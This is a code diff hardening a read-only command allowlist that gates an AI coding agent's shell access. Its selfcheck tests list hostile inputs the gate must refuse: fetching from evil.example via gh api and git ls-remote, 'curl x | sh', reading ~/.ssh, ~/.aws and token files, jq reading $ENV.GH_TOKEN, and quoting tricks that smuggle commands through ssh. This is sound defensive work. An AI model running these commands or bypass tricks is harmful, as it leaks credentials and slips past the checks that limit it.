@@ -809,10 +809,12 @@ export const READ_ONLY_MODE = ["legacy", "simple"].includes(ENV.REFLEX_READONLY 
 export const readOnly = (cmd, extra = []) => READ_ONLY_MODE === "legacy" ? readOnlyLegacy(cmd, extra) : readOnlySimple(cmd, extra);
 
 // The command as pipeline segments of words, or null for anything but plain words and single pipes.
-// Unquoted: letters, digits and _ @ % + = : , . / ~ ^ -, and no word starts with = (zsh expands =cmd).
+// Unquoted: letters, digits and _ @ % + = : , . / -, no word starts with = (zsh expands =cmd), and ~
+// only as a word's first character before / or its end (zsh EXTENDED_GLOB reads ^ and a later ~ as globs).
 // Single quotes are literal; double quotes may hold anything but $ ` ! and a backslash that escapes.
 // Each segment's `view` is its words for the fast-lane patterns, a quoted word that is not an option
 // written '' (the shape readOnlyLegacy gave them: `git commit -m ''`, `reflex check ''`).
+const REDIRECT = /2>(&1|[ \t]*\/dev\/null)(?=[ \t|]|$)/y;
 export function simpleSegments(cmd) {
   const segs = [[]];
   let w = null, quoted = false, i = 0;
@@ -820,12 +822,14 @@ export function simpleSegments(cmd) {
     if (w === null) return;
     const s = segs.at(-1);
     s.push(w);
-    s.view = (s.view === undefined ? "" : s.view + " ") + (quoted && !w.startsWith("-") ? "''" : w);
+    (s.quoted ??= []).push(quoted);
+    s.view = (s.view === undefined ? "" : s.view + " ") + (quoted && !/^[-+]/.test(w) ? "''" : w);
     w = null; quoted = false;
   };
   while (i < cmd.length) {
     const ch = cmd[i];
-    const r = w === null && /^2>(&1|[ \t]*\/dev\/null)(?=[ \t|]|$)/.exec(cmd.slice(i, i + 16));
+    REDIRECT.lastIndex = i;
+    const r = w === null && REDIRECT.exec(cmd);
     if (r) { i += r[0].length; continue; }
     if (ch === " " || ch === "\t") { end(); i++; }
     else if (ch === "|") { end(); if (!segs.at(-1).length || cmd[i + 1] === "|" || cmd[i + 1] === "&") return null; segs.push([]); i++; }
@@ -839,7 +843,8 @@ export function simpleSegments(cmd) {
     }
     // the one escape: \' for a quote between single-quoted parts ('it'\''s'), as /reflex:check writes it
     else if (ch === "\\" && cmd[i + 1] === "'" && w !== null) { w += "'"; quoted = true; i += 2; }
-    else if (/[\w@%+=:,./~^-]/.test(ch) && !(w === null && ch === "=")) { if (w === null && ch === "~") segs.at(-1).tilde = true; w = (w ?? "") + ch; i++; }
+    else if (/[\w@%+=:,./-]/.test(ch) && !(w === null && ch === "=")) { w = (w ?? "") + ch; i++; }
+    else if (ch === "~" && w === null && /^(\/|[ \t|]|$)/.test(cmd.slice(i + 1, i + 2))) { segs.at(-1).tilde = true; w = "~"; i++; }
     else return null;
   }
   end();
@@ -886,6 +891,8 @@ const upTo = n => p => p.length <= n;
 // diff.external, aliases). Left out everywhere: --output, --ext-diff, --textconv, --show-signature
 // (runs gpg), -O for grep (a pager). A repository's own config still applies (a diff.external or
 // core.fsmonitor set in .git/config runs), as it does for every git command the agent runs.
+// %G… and %(signature…) in a format verify signatures, which runs gpg.program
+const NO_SIG = v => !/%G|%\(signature/.test(v), SIG_VALS = {vals: {format: NO_SIG, pretty: NO_SIG}};
 const GIT_LOG = F("pusmcrtzwbRaiEFPgWNqh", "nSGL", [
   "oneline", "graph", "all", "branches?", "tags?", "remotes?", "stat?", "shortstat", "numstat", "name-only", "name-status", "patch", "no-patch",
   "decorate?", "no-decorate", "abbrev-commit", "no-abbrev-commit", "abbrev?", "reverse", "first-parent", "merges", "no-merges", "follow", "left-right",
@@ -898,7 +905,7 @@ const GIT_LOG = F("pusmcrtzwbRaiEFPgWNqh", "nSGL", [
   "unified?", "function-context", "ignore-cr-at-eol", "text", "no-prefix", "diff-merges?", "no-diff-merges", "show-notes?", "no-notes", "expand-tabs?",
 ], ["format", "pretty", "author", "committer", "since", "until", "after", "before", "grep", "max-count", "skip", "date", "min-parents", "max-parents",
   "glob", "exclude", "diff-filter", "decorate-refs", "decorate-refs-exclude", "stat-width", "encoding", "ignore-matching-lines", "anchored",
-  "word-diff-regex", "inter-hunk-context", "src-prefix", "dst-prefix", "line-prefix", "since-as-filter"], {o: "MCBUlO", num: true});
+  "word-diff-regex", "inter-hunk-context", "src-prefix", "dst-prefix", "line-prefix", "since-as-filter"], {o: "MCBUlO", num: true, ...SIG_VALS});
 const GIT_BRANCH_LIST = ["list", "contains", "no-contains", "merged", "no-merged", "points-at"];
 const GIT = {
   status: F("sbuvz", "", ["short", "branch", "porcelain?", "long", "verbose", "untracked-files?", "ignored?", "ignore-submodules?", "show-stash",
@@ -906,29 +913,29 @@ const GIT = {
   log: GIT_LOG, show: GIT_LOG, diff: GIT_LOG, shortlog: {...GIT_LOG, l: [...GIT_LOG.l, "summary", "numbered", "email"], lv: [...GIT_LOG.lv, "group"], s: GIT_LOG.s + "ne", o: "w"},
   // a branch name creates a branch, unless a list flag makes it a pattern
   branch: {...F("arvl", "", ["all", "remotes", "verbose", "list", "show-current", "merged?", "no-merged?", "color?", "no-color", "column?", "no-column",
-    "omit-empty", "ignore-case"], ["contains", "no-contains", "points-at", "sort", "format", "abbrev"]), pos: p => !p.length},
+    "omit-empty", "ignore-case"], ["contains", "no-contains", "points-at", "sort", "format", "abbrev"], SIG_VALS), pos: p => !p.length},
   "rev-parse": F("q", "", ["abbrev-ref?", "short?", "show-toplevel", "git-dir", "git-common-dir", "absolute-git-dir", "is-inside-work-tree", "is-inside-git-dir",
     "is-bare-repository", "is-shallow-repository", "show-prefix", "show-cdup", "show-superproject-working-tree", "verify", "quiet", "symbolic",
     "symbolic-full-name", "all", "branches?", "tags?", "remotes?", "show-object-format?", "show-ref-format", "sq", "not", "revs-only", "no-revs",
     "flags", "no-flags"], ["git-path", "default", "since", "until", "after", "before", "prefix"]),
   "ls-files": F("cdmoiskuzvtfe", "x", ["cached", "deleted", "modified", "others", "ignored", "stage", "killed", "unmerged", "exclude-standard", "directory",
-    "no-empty-directory", "full-name", "error-unmatch", "recurse-submodules", "deduplicate", "eol", "sparse", "abbrev?"], ["exclude", "with-tree", "format"]),
+    "no-empty-directory", "full-name", "error-unmatch", "recurse-submodules", "deduplicate", "eol", "sparse", "abbrev?"], ["exclude", "with-tree", "format"], SIG_VALS),
   "ls-tree": F("rdtlz", "", ["name-only", "name-status", "object-only", "full-name", "full-tree", "long", "abbrev?"], ["format"]),
   blame: F("blnpstwefck", "L", ["porcelain", "line-porcelain", "incremental", "show-email", "show-name", "show-number", "root", "show-stats", "abbrev?",
     "color-lines", "color-by-age", "minimal"], ["date", "ignore-rev"], {o: "MC"}),
   describe: F("", "", ["tags", "all", "always", "long", "exact-match", "first-parent", "dirty?", "broken?", "contains", "abbrev?"], ["match", "exclude", "candidates"]),
   "merge-base": F("a", "", ["all", "is-ancestor", "fork-point", "octopus", "independent"]),
   "show-ref": F("dsq", "", ["head", "heads", "tags", "branches", "dereference", "hash?", "verify", "quiet", "abbrev?", "exists"]),
-  "for-each-ref": F("", "", ["no-merged?", "merged?", "include-root-refs", "ignore-case", "omit-empty"], ["format", "sort", "count", "points-at", "contains", "no-contains", "exclude"]),
+  "for-each-ref": F("", "", ["no-merged?", "merged?", "include-root-refs", "ignore-case", "omit-empty"], ["format", "sort", "count", "points-at", "contains", "no-contains", "exclude"], SIG_VALS),
   "rev-list": {...GIT_LOG, l: [...GIT_LOG.l, "count", "objects", "no-object-names", "timestamp", "header", "left-right"]},
 };
 const gitSub = {
   remote: a => !a.length || (a.length === 1 && /^(-v|--verbose)$/.test(a[0])) || (a[0] === "get-url" && flagsOk(a.slice(1), F("", "", ["push", "all"], [], {pos: upTo(1)}))),
   tag: a => !a.length || (a.some(x => /^(-l|--list)$/.test(x)) && flagsOk(a, F("ln", "", ["list", "column?", "no-column", "ignore-case", "omit-empty", "merged?", "no-merged?"],
-    ["sort", "format", "contains", "no-contains", "points-at"], {o: "n"}))),
+    ["sort", "format", "contains", "no-contains", "points-at"], {o: "n", ...SIG_VALS}))),
   stash: a => a[0] === "list" ? flagsOk(a.slice(1), {...GIT_LOG, pos: false}) : a[0] === "show" && flagsOk(a.slice(1), {...GIT_LOG, pos: upTo(1)}),
   "ls-remote": a => flagsOk(a, F("qht", "", ["heads", "tags", "branches", "refs", "quiet", "exit-code", "symref", "get-url"], ["sort"],
-    {pos: p => !!p.length && /^(https:\/\/[\w.@:\/%+-]+|git@[\w.-]+:[\w.\/-]+|[\w.-]+)$/.test(p[0])})),
+    {pos: p => !!p.length && /^(https:\/\/github\.com\/[\w.\/-]+|git@github\.com:[\w.\/-]+|[\w.-]+)$/.test(p[0])})),
   worktree: a => a[0] === "list" && flagsOk(a.slice(1), only(F("vz", "", ["porcelain", "verbose"], ["expire"]))),
   branch: a => (a.some(x => GIT_BRANCH_LIST.some(f => x === `--${f}` || x.startsWith(`--${f}=`)) || x === "-l") ? flagsOk(a, {...GIT.branch, pos: true}) : flagsOk(a, GIT.branch)),
 };
@@ -958,7 +965,7 @@ function kubectlOk(a) {
   let i = 0;
   while (i < a.length && a[i].startsWith("-")) i += KUBE_VALUE.test(a[i]) ? 2 : 1;
   const sub = a[i];
-  if (!Object.hasOwn(KUBE, sub ?? "") || a.some(x => x.split(",").some(r => /^secrets?(\/|$)/i.test(r)))) return false;
+  if (!Object.hasOwn(KUBE, sub ?? "") || a.some(x => x.split(",").some(r => /^secrets?(\.|\/|$)/i.test(r)))) return false;
   return flagsOk([...a.slice(0, i), ...a.slice(i + 1)], KUBE[sub]);
 }
 
@@ -970,10 +977,15 @@ function kubectlOk(a) {
 // --with-decryption / --include-value(s).
 const AWS_CLI_OPTS = new Set(["profile", "region", "output", "query", "color", "no-cli-pager", "no-paginate", "cli-read-timeout", "cli-connect-timeout",
   "no-sign-request", "cli-binary-format", "page-size", "max-items", "starting-token"]);
+// argparse also takes a prefix (--with-decrypt, --endpoint, --debu): any prefix of these is refused too
+const AWS_CLI_ONLY_NAMES = ["endpoint-url", "cli-input-json", "cli-input-yaml", "generate-cli-skeleton", "debug", "ca-bundle", "no-verify-ssl",
+  "cli-auto-prompt", "no-cli-auto-prompt", "with-decryption", "include-value", "include-values", "outfile"];
 const AWS_CLI_ONLY = /^--(endpoint-url|cli-input-json|cli-input-yaml|generate-cli-skeleton|debug|ca-bundle|no-verify-ssl|cli-auto-prompt|no-cli-auto-prompt|with-decryption|include-values?|outfile)(=|$)/;
 // Streaming operations write their output to a file named last (get-object, get-export, ...): those too.
 const AWS_NOT_READ = new RegExp("secret|passw|token|credential|login|auth|access-details|key-pair|api-key|private-key|decrypt|session|federation|sign|" +
-  "get-(object|job-output|media|clip|export|sdk|configuration|latest-configuration|package-version-asset|read-set|reference|tile|snapshot-block|raw|images)");
+  "stream-key|instance-access|compute-access|^get-connections?$|thumbnail|" +
+  "get-(object|job-output|media|clip|export|sdk|configuration|latest-configuration|package-version-asset|read-set|reference|tile|snapshot-block|raw|images|" +
+  "chunk|work-unit-results|image-frame|image-set-metadata)");
 const AWS_NO_VALUE = /^--(no-[\w-]+|dry-run|recursive|human-readable|summarize)$/;
 function awsOk(a) {
   let i = 0;
@@ -985,7 +997,8 @@ function awsOk(a) {
   }
   const [service, op, ...rest] = a.slice(i);
   if (!service || !op || op.startsWith("-") || service.startsWith("-")) return false;
-  if (rest.some(x => /^fileb?:\/\//i.test(x.replace(/^--[\w-]+=/, "")) || AWS_CLI_ONLY.test(x) || (x.startsWith("-") && !/^--[a-z][a-z0-9-]*(=|$)/.test(x)))) return false;
+  if (rest.some(x => /^fileb?:\/\//i.test(x.replace(/^--[\w-]+=/, "")) || AWS_CLI_ONLY.test(x) || (x.startsWith("-") && !/^--[a-z][a-z0-9-]*(=|$)/.test(x)) ||
+      (x.startsWith("--") && AWS_CLI_ONLY_NAMES.some(n => n.startsWith(x.slice(2).split("=")[0]))))) return false;
   if (service === "s3") return op === "ls" && flagsOk(rest, F("", "", ["recursive", "human-readable", "summarize", "no-cli-pager", "no-paginate"],
     ["profile", "region", "output", "page-size", "query", "color", "request-payer"], {pos: upTo(1)}));
   if (service === "configure") return /^(list|list-profiles)$/.test(op) && flagsOk(rest, only(F("", "", [], ["profile"])));
@@ -1007,6 +1020,7 @@ function jqOk(a) {
     rest.push(a[i]);
   }
   if (!flagsOk(rest, JQ)) return false;
+  if (rest.includes("--")) return false;
   const filter = rest.find(x => !x.startsWith("-") || x === "-");
   return filter === undefined || !JQ_UNSAFE.test(filter);
 }
@@ -1019,7 +1033,7 @@ function terraformOk(a) {
   if (sub === "version") return rest.every(x => x === "-json");
   if (/^-{1,2}(version|v)$/.test(sub)) return !rest.length;
   return sub === "fmt" && rest.some(x => x === "-check" || x === "-write=false") &&
-    rest.every(x => /^-(check|diff|recursive|no-color|list=(true|false)|write=false)$/.test(x) || !x.startsWith("-"));
+    rest.every(x => /^-(check|recursive|no-color|list=(true|false)|write=false)$/.test(x) || !x.startsWith("-"));
 }
 
 // docker ps, images and logs: no --config (a credential helper), no -H or other daemons than the context.
@@ -1058,14 +1072,18 @@ function findOk(a) {
 }
 // gh: pr, issue, run, repo and release reads, auth status without --show-token, and api as a GET
 // (no -X, --method, -f, -F, --field, --raw-field, --input or -H, and not graphql). No --web (runs a browser).
+// gh's --jq is gojq with the process environment ($ENV.GH_TOKEN): held to jq's rule
+const GH_JQ = {vals: {q: v => !JQ_UNSAFE.test(v), jq: v => !JQ_UNSAFE.test(v)}};
 const GH_READ = F("", "RqtLsAlBHSacbuej", ["json?", "comments", "log", "log-failed", "watch", "required", "fail-fast", "exit-status", "name-only", "patch", "draft",
   "verbose", "all", "exclude-drafts", "exclude-pre-releases"], ["repo", "jq", "template", "limit", "state", "author", "label", "base", "head", "search", "assignee",
-  "mention", "milestone", "status", "commit", "created", "job", "attempt", "branch", "user", "event", "workflow", "interval", "color", "app", "json", "order", "sort"]);
+  "mention", "milestone", "status", "commit", "created", "job", "attempt", "branch", "user", "event", "workflow", "interval", "color", "app", "json", "order", "sort"], GH_JQ);
 const GH = {pr: /^(view|list|checks|diff|status)$/, issue: /^(view|list|status)$/, run: /^(view|list|watch)$/, repo: /^view$/, release: /^(view|list)$/};
 function ghOk(a) {
   const [group, sub, ...rest] = a;
   if (group === "auth") return sub === "status" && flagsOk(rest, only(F("a", "h", ["active"], ["hostname"])));
-  if (group === "api") return !!sub && sub !== "graphql" && !sub.startsWith("-") && flagsOk(rest, only(F("iq", "qt", ["paginate", "slurp", "include", "silent", "verbose"], ["jq", "template", "cache"])));
+  // an endpoint path on the GitHub host: a full URL to another host carries data out in its path
+  if (group === "api") return !!sub && sub !== "graphql" && !sub.startsWith("-") && !/^[a-z]+:\/\//i.test(sub) &&
+    flagsOk(rest, only(F("iq", "qt", ["paginate", "slurp", "include", "silent", "verbose"], ["jq", "template", "cache"], GH_JQ)));
   return Object.hasOwn(GH, group ?? "") && GH[group].test(sub ?? "") && flagsOk(rest, GH_READ);
 }
 // ssh host '<read-only>': ssh joins the words after the host with spaces and the remote shell reads
@@ -1080,6 +1098,7 @@ function sshOk(a, {first, tilde}) {
     if (!(o !== null ? o !== undefined && SSH_OPT.test(o) : p !== null ? /^\d+$/.test(p ?? "") : false)) return false;
   }
   const host = a[i], remote = a.slice(i + 1).join(" ");
+  if (remote.includes("\\")) return false;   // a remote fish shell reads \' inside '...' as a quote
   // an unquoted ~ is the local home, sent to the host: refused
   return first && !tilde && !!host && /^([\w][\w.-]*@)?[\w][\w.-]*$/.test(host) && !!remote.trim() && readOnlySimple(remote);
 }
@@ -1113,7 +1132,7 @@ export const READ_ONLY_SIMPLE = {
   pwd: only(F("LP")), whoami: only(F()), nproc: only(F("", "", ["all"], ["ignore"])),
   uname: only(F("amnprsvio", "", ["all", "kernel-name", "nodename", "kernel-release", "kernel-version", "machine", "processor", "hardware-platform", "operating-system"])),
   // no -s / --set, and an operand only as +FORMAT (an operand without + sets the clock)
-  date: F("uRjn", "drvfz", ["utc", "universal", "rfc-email", "iso-8601?", "debug"], ["date", "reference", "rfc-3339"], {o: "I", pos: p => p.every(x => x.startsWith("+"))}),
+  date: F("uRjn", "drvfz", ["utc", "universal", "rfc-email", "iso-8601?", "debug"], ["date", "reference", "rfc-3339"], {o: "I", pos: p => p.length <= 1 && p.every(x => x.startsWith("+"))}),
   cat: F("benstuvAETl", "", ["number", "number-nonblank", "show-all", "show-ends", "show-tabs", "squeeze-blank", "show-nonprinting"]),
   head: F("qv", "nc", ["quiet", "silent", "verbose"], ["lines", "bytes"], {num: true}),
   tail: F("fFqvr", "ncs", ["follow?", "retry", "quiet", "silent", "verbose"], ["lines", "bytes", "sleep-interval", "pid"], {num: true}),
@@ -1176,8 +1195,10 @@ export const READ_ONLY_SIMPLE = {
 };
 READ_ONLY_SIMPLE.egrep = READ_ONLY_SIMPLE.fgrep = READ_ONLY_SIMPLE.grep;
 // A public key, known_hosts and an .env template are not secrets.
-const SIMPLE_SECRET = w => [w, w.replace(/^-[^=]*=/, "")].some(x => (SENSITIVE.test(x) && !/\.pub$|(^|\/)known_hosts$|\.env\.(example|sample|template|dist)$/.test(x)) ||
-  /(^|\/)environ$|(^|\/)\.git-credentials$/.test(x));
+// A secret directory counts named without a trailing slash (grep -r x ~/.ssh), and so do common token files.
+const SECRET_WORD = /(^|\/)\.(ssh|aws|gnupg|kube|docker)(\/|$)|(^|\/)(environ|\.git-credentials|\.pgpass|\.vault-token|hosts\.yml|auth\.json|\.credentials\.json|credentials\.(toml|json)|\.tfrc\.json|credentials\.tfrc\.json|application_default_credentials\.json)$/;
+const SIMPLE_SECRET = w => [w, w.replace(/^-[^=]*=/, ""), w.replace(/^[^:]*:/, "")].some(x => (SENSITIVE.test(x) || SECRET_WORD.test(x)) &&
+  !/\.pub$|(^|\/)known_hosts$|\.env\.(example|sample|template|dist)$/.test(x));
 
 // `extra`: segment patterns that are safe but not read-only (the fast lanes), tested on the segment's
 // view (simpleSegments).
@@ -1186,10 +1207,11 @@ export function readOnlySimple(cmd, extra = []) {
   return !!segs && segs.every((words, n) => {
     if (words.some(SIMPLE_SECRET)) return false;
     if (extra.some(re => re.test(words.view))) return true;
-    // AWS selectors, then rtk (a token filter that runs the command after it)
+    // AWS selectors (unquoted: a quoted one is a program name), then rtk proxy
     let k = 0;
-    while (k < words.length - 1 && /^(AWS_PROFILE|AWS_REGION|AWS_DEFAULT_REGION)=[\w.-]*$/.test(words[k])) k++;
-    if (words[k] === "rtk" && k < words.length - 1) k += words[k + 1] === "proxy" && k < words.length - 2 ? 2 : 1;
+    while (k < words.length - 1 && !words.quoted[k] && /^(AWS_PROFILE|AWS_REGION|AWS_DEFAULT_REGION)=[\w.-]*$/.test(words[k])) k++;
+    // rtk proxy runs the command as it is; rtk's own subcommands re-implement tools (rtk grep is rg)
+    if (words[k] === "rtk" && words[k + 1] === "proxy" && k < words.length - 2) k += 2;
     const [prog, ...args] = words.slice(k), name = prog.replace(/^\/(usr\/)?bin\/(?=[\w.-]+$)/, "");
     if (args.length === 1 && args[0] === "--version" && VERSION_ONLY.has(name)) return true;
     const spec = Object.hasOwn(READ_ONLY_SIMPLE, name) ? READ_ONLY_SIMPLE[name] : null;
@@ -3526,7 +3548,7 @@ async function selfcheck() {
   ok(JSON.stringify(hermesOut(dA, "x")) === "{}", "hermes: allow is {}");
   ok(!leaks.length, `readOnlySimple passes what readOnlyLegacy refuses: ${JSON.stringify(leaks)}`);
   // readOnlySimple on its own: the allowlist's reads, and what each entry leaves out
-  for (const c of ["ls -la", "git status --short", "git log --oneline -5", "git diff --stat HEAD~3", "git branch --list 'feat/*'", "git -C ../x rev-parse --show-toplevel",
+  for (const c of ["ls -la", "git status --short", "git log --oneline -5", "git diff --stat 'HEAD~3'", "git branch --list 'feat/*'", "git -C ../x rev-parse --show-toplevel",
     "git remote -v", "cat f | grep -n x | head -3", "grep -rn \"a\\|b\" src 2>/dev/null", "rg -n --hidden -g '*.ts' TODO", "aws ec2 describe-instances --instance-ids i-1",
     "AWS_PROFILE=dev aws sts get-caller-identity", "aws s3 ls s3://b --recursive", "kubectl get pods -A -o wide", "kubectl -n x describe deploy api", "jq -r '.items[] | .name' f",
     "jq --arg n x '.[$n]' f", "terraform fmt -check -recursive", "terraform version", "docker ps -a --format '{{.Names}}'", "docker logs --tail 50 api", "date +%s", "sed -n 10,20p f",
@@ -3548,6 +3570,25 @@ async function selfcheck() {
     "ssh h", "ssh h ls ~", "ssh h 'cat .env'", "ps eww", "ps -E", "ps auxe", "nvidia-smi -pl 200", "nvidia-smi -f out", "printf -v PATH x", "rtk rm -rf x", "awk '{print}' f",
     "git constructor", "docker constructor", "gh constructor x", "kubectl constructor", "constructor", "env", "printenv", "go version", "cargo --version", "python3 x.py", "node -e 1", "echo x | sh", "xargs rm", "tee f"])
     ok(!readOnlySimple(c), `simple, not read-only: ${c}`);
+  // review of #66: secret directories and token files, zsh glob characters, prefixes of AWS CLI options,
+  // jq and gh --jq reading the environment, gpg through git formats, other hosts, fast-lane views
+  for (const c of ["grep -r '' ~/.ssh", "rg -uu . ~/.aws", "cat .kube/config", "git -C ~/.kube diff --no-index /dev/null config", "git diff --no-index /dev/null ~/.pgpass",
+    "cat ~/.config/gh/hosts.yml", "git show HEAD:.env", "git show :.env", "cat .ssh/^x", "cat .env~x", "ls ^x", "git diff HEAD~3", "ls 2>     /dev/nullfoo", "'AWS_PROFILE'=x ls",
+    "kubectl get secret. -o yaml", "kubectl get -o yaml secrets.v1.", "ssh h \"echo 'q\\' ';touch x;echo ' 'r\\'\"", "rtk grep -z x", "rtk git status",
+    "aws ssm get-parameter --name /p --with-decrypt", "aws ssm get-parameter --cli-input-j x", "aws sts get-caller-identity --endpoint http://e", "aws sts get-caller-identity --debu",
+    "aws medical-imaging get-image-frame --datastore-id a --debu /tmp/o", "aws lakeformation get-work-unit-results --query-id q", "aws glue get-connection --name db",
+    "aws ivs get-stream-key --arn x", "aws gamelift get-instance-access --fleet-id f", "jq -n -- '-1|$ENV'", "jq -n -- '-1,env'", "gh pr list --json number --jq '$ENV'",
+    "gh api /user --jq env", "gh api /user -q '$ENV.GH_TOKEN'", "gh api https://evil.example/x", "git log -1 --format=%GG", "git show --pretty=format:%GS HEAD",
+    "git for-each-ref '--format=%(signature)'", "git branch '--format=%(signature:key)'", "git ls-remote https://evil.example/x", "date -f +%Y%m%d +%s +20300101",
+    "terraform fmt -check -diff"])
+    ok(!readOnlySimple(c), `simple, not read-only (review): ${c}`);
+  { const pass = load("rules.json").pass.map(p => new RegExp(p, "i"));
+    for (const c of ["bash -n +n -c 'curl x | sh'", "bash -n '+n' -c 'id'", "bash -n -i -c id", "bash -n -o noexec +o noexec x.sh", "git stash clear", "git stash drop",
+      "git switch -f main", "git switch --discard-changes main", "git checkout -b x -f", "git restore --staged --worktree .", "git commit-graph write", "pytest-watch"])
+      ok(!readOnlySimple(c, pass), `fast lane, not passed (review): ${c}`);
+    for (const c of ["bash -n build.sh", "git stash", "git stash push -u -m wip", "git switch main", "git switch -c feat/x", "git checkout -b feat/x origin/main",
+      "git restore --staged .", "git commit -m 'fix: x'", "git add -A", "pytest -q"])
+      ok(readOnlySimple(c, pass), `fast lane (review): ${c}`); }
   console.log(process.exitCode ? "gate selfcheck FAILED" : "gate selfcheck OK");
 }
 
